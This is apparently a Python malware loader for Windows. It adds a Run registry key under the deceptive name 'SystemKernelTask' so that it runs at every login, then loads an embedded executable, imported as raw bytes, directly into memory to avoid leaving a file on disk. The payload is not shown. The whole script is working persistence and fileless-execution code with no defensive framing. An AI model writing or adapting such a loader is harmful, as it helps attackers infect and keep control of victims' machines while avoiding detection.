

from exeBytes import exeBytes
from pythonmemorymodule import MemoryModule


from pathlib import Path
import winreg



import ctypes


if ctypes.sizeof(ctypes.c_void_p) != 8:
    raise RuntimeError("Need x64 python")

print("Python x64")



script = Path(__file__).resolve()
python = script.parent / "pythonw.exe"

if not python.is_file():
    raise FileNotFoundError(python)


with winreg.CreateKey(
    winreg.HKEY_CURRENT_USER,
    r"Software\Microsoft\Windows\CurrentVersion\Run",
) as key:
    winreg.SetValueEx(key, "SystemKernelTask", 0, winreg.REG_SZ, f'"{python}" "{script}"')


exe = MemoryModule(data = bytes(exeBytes))
